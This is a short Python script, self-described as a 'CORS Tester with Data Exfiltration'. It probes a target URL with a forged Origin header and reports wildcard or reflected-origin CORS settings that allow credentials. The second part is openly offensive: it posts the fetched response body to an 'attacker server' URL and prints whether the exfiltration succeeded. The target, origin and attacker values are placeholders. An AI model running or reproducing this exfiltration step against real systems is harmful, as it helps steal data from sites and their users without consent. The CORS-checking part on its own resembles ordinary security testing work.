import requests

def test_and_send_response(target_url, custom_origin, attacker_url):
    headers = {
        'Origin': custom_origin,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Cookie': ''
    }
    
    try:
        print(f"\nTesting: {target_url}")
        print(f"Using Origin: {custom_origin}")
        
        response = requests.get(target_url, headers=headers, timeout=10)
        
        print("\nResponse Headers:")
        for header, value in response.headers.items():
            if 'Access-Control' in header:
                print(f"{header}: {value}")
        
        acao = response.headers.get('Access-Control-Allow-Origin')
        acac = response.headers.get('Access-Control-Allow-Credentials', 'false')
        
        print("\nAnalysis:")
        if acao == '*':
            print("- Server allows any origin (*)")
            if acac == 'true':
                print("- [!] CRITICAL: Allows credentials with wildcard origin")
            else:
                print("- Potentially unsafe wildcard CORS (without credentials)")
        elif acao == custom_origin:
            print(f"- Server reflects exact origin: {custom_origin}")
            if acac == 'true':
                print("- [!] DANGEROUS: Allows credentials with reflected origin")
            else:
                print("- Less dangerous but still insecure CORS implementation")
        else:
            print("- Server doesn't reflect our origin")
            print("- No obvious CORS misconfiguration detected")
        
        if attacker_url:
            print("\nSending data to attacker server...")
            payload = {
                'target_url': target_url,
                'origin_used': custom_origin,
                'status_code': response.status_code,
                'response_headers': dict(response.headers),
                'response_body': response.text
            }
            
            send_response = requests.post(
                attacker_url,
                json={'data': response.text},
                timeout=5
            )
            
            if send_response.status_code == 200:
                print("Data successfully sent to attacker server")
            else:
                print(f"Failed to send data. Attacker server responded with: {send_response.status_code}")
            
    except Exception as e:
        print(f"Error occurred: {e}")


if __name__ == "__main__":
    print("CORS Tester with Data Exfiltration")
    
    target = 'target'
    origin = 'origin'
    attacker = 'URL'
    
    test_and_send_response(target, origin, attacker if attacker else None)